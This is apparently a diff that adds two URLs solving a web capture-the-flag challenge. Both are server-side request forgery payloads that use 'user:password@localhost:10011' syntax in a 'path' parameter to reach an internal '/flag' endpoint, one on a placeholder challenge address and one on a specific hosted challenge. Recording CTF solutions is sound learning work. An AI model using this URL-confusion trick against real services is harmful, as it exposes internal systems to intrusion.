@@ -1,0 +1,3 @@
+http://<chal-ip>/ssrf?path=sam:foo@localhost:10011/flag
+
+https://wsc-2022-web-4-bvel4oasra-uc.a.run.app/ssrf?path=:fakepassword@localhost:10011/flag
